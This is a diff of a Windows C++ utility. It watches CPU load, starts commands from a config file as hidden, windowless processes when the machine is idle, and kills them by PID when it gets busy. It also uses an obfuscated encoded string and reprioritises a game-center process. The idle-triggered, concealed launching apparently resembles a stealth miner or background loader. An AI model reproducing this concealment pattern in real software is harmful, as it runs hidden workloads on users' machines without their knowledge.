@@ -4,6 +4,7 @@
 #include <fstream>
 #include <sstream>
 #include <vector>
+#include <stack>
 
 //#include <memory>
 //#include <future>
@@ -25,18 +26,39 @@ int CPU = 0;
 int IDLE = 0;
 int BUSY = 0;
 
-int thr;
+int PooID = 0;
 
 bool show_cpu = true;
 bool cons = false;
 
 vector<hide::line> Run;
+std::stack<DWORD> JOBs;
 
 #define TIMEOUT     10
 #define DEADLINE    5 
 
-int THRMAX = 0;
+int THRMAX = 3;
 
+void job (void)
+{
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+
+    ::ZeroMemory(&si, sizeof si);
+    si.cb = sizeof si;
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+cout << "Run: " << Run[PooID].c_str() << endl;
+
+    ::CreateProcess(NULL, (LPSTR) Run[PooID].c_str(), NULL, NULL, FALSE, 
+              CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+
+    JOBs.push(pi.dwProcessId);
+
+    ::CloseHandle(pi.hThread);
+    ::CloseHandle(pi.hProcess);
+}
 /*
  * ==================
  */
@@ -57,7 +79,7 @@ sper >> CPU;
 
 if (show_cpu) cout << CPU << endl;
 
-if ( ((100 - CPU) > 20) && thr < THRMAX ) {
+if ( ((100 - CPU) > 20) && JOBs.size() < THRMAX ) {
    ++IDLE;  
 
 cout << "IDLE: " << IDLE << endl;
@@ -65,7 +87,7 @@ cout << "IDLE: " << IDLE << endl;
 }
 else IDLE = 0;
 
-if ((100 - CPU) < 5 && thr > 1) {
+if ((100 - CPU) < 5 && JOBs.size() > 1) {
    ++BUSY;  
 
 cout << "BUSY: " << BUSY << endl;
@@ -75,27 +97,18 @@ else BUSY = 0;
 
 if (IDLE == TIMEOUT) {
     IDLE = 0;
-    thr = (thr == THRMAX) ? thr : ++thr; 
-
-cout << "IDLE STOP GameCenter" << endl;
-    ::popen("taskkill /IM GameCenterMailRu.exe /F /FI \"USERNAME eq %USERNAME%\" 2>&1","r");
-cout << "Run: " << thr << endl;
-    ::popen( Run[thr].c_str(), "r"); 
-    pipe = ::popen("tasklist /nh  /FI \"USERNAME eq USER4\" /FI \"IMAGENAME eq GameCenterMailRu.exe\"", "r");
-//    while pipe
-
+    job();
     ::popen("wmic process where name=\"GameCenterMailRu.exe\" setpriority=128", "r");
 
 } else 
     if (BUSY == DEADLINE) {
         BUSY = 0;
-        thr = (thr == 0) ? thr : --thr; 
+        stringstream pid("taskkill /PID ");
+        pid << JOBs.top();
 
-cout << "BUSY STOP GameCenter" << endl;
-        ::popen("taskkill /IM GameCenterMailRu.exe /F /FI \"USERNAME eq %USERNAME%\" 2>&1", "r");
-cout << "Run: " << thr << endl;
-        ::popen( Run[thr].c_str(), "r"); 
-        ::popen("wmic process where name=\"GameCenterMailRu.exe\" setpriority=128", "r");
+cout << pid.str() << endl;
+        ::popen(pid.str().c_str(), "r");
+        JOBs.pop();
    }
 
 }
@@ -136,13 +149,10 @@ static hide::line name("FJUC7Qibj6LAL8FrYUsJ5jbGMpMogbSdwCvpWGB/Jc822zvPVJ2GuVeh
 
 static hide::line arg, Args;
 
-Run.push_back("echo");
-
 while ( getline(ini, arg)) {
     if ( *(arg.begin()) == '#') {
         Args.append(" 2>&1");
         Run.push_back(Args);
-        THRMAX++;
         Args.clear();
         continue;
     }
@@ -156,8 +166,6 @@ if (cons)
     throw runtime_error("^^^ eof");
 if ( !Run.size())
     throw runtime_error("never mind");
-
-    cout << "MAX: " << THRMAX << endl;
 
 thread th1(Timer);
 th1.detach();
